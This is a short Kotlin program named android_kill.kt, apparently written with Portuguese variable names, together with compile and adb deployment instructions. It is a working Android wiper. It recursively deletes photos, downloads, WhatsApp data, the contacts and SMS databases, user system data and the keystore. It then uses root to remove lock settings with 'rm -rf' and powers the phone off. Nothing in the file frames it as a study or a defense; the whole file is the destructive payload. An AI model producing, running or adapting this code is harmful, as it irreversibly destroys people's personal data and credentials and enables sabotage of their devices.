
// android_kill.kt
// Compile: kotlinc android_kill.kt -include-runtime -d android_kill.jar
// Execute: adb push android_kill.jar /data/local/tmp && adb shell app_process /data/data/com.termux android_killKt

import java.io.File
import kotlin.system.exitProcess

fun main() {
    val alvos = listOf(
        "/storage/emulated/0/Android",
        "/storage/emulated/0/DCIM",
        "/storage/emulated/0/Download",
        "/storage/emulated/0/WhatsApp",
        "/data/data/com.android.providers.contacts/databases",
        "/data/data/com.android.providers.telephony/databases",
        "/data/system/users/0",
        "/data/misc/keystore"
    )

    fun apaga(f: File) {
        if (f.isDirectory) f.listFiles()?.forEach { apaga(it) }
        f.delete()
    }

    alvos.map { File(it) }.filter { it.exists() }.forEach { apaga(it) }

    // Limpeza final
    Runtime.getRuntime().exec("su -c 'rm -rf /data/system/locksettings*'")
    Runtime.getRuntime().exec("su -c 'reboot -p'")
}
